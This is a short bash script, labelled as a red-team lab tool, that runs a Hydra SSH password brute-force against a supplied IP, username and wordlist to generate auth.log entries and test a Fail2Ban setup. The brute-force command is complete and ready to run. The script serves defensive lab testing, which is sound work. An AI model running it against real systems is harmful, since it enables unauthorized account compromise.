#!/usr/bin/env bash
#
# Role: RED TEAM
# Purpose:
#   Demonstrate SSH brute-force attempts using Hydra in a controlled lab environment
#   to generate logs and validate Fail2Ban response.
#
# WARNING:
#   Only use this script against lab systems that you own or are explicitly
#   authorized to test. Do NOT use against production or external systems.
#
# Usage:
#   ./scripts/ssh_bruteforce_test.sh <TARGET_IP> <USERNAME> <WORDLIST>
#

set -euo pipefail

if [[ $# -lt 3 ]]; then
  echo "Usage: $0 <TARGET_IP> <USERNAME> <WORDLIST>"
  echo "Example:"
  echo "  $0 192.0.2.10 secadmin /usr/share/wordlists/rockyou.txt"
  exit 1
fi

TARGET="$1"
USERNAME="$2"
WORDLIST="$3"

if ! command -v hydra >/dev/null 2>&1; then
  echo "[!] hydra is not installed. Install with: sudo apt install hydra"
  exit 1
fi

if [[ ! -f "${WORDLIST}" ]]; then
  echo "[!] Wordlist not found: ${WORDLIST}"
  exit 1
fi

echo "[*] Launching Hydra SSH brute-force against ${TARGET} for user ${USERNAME}"
echo "    This is intended to generate auth.log entries and trigger Fail2Ban."

hydra -l "${USERNAME}" -P "${WORDLIST}" ssh://"${TARGET}" -t 4 -V

echo "[+] Hydra run complete. Check /var/log/auth.log and Fail2Ban status on the target."
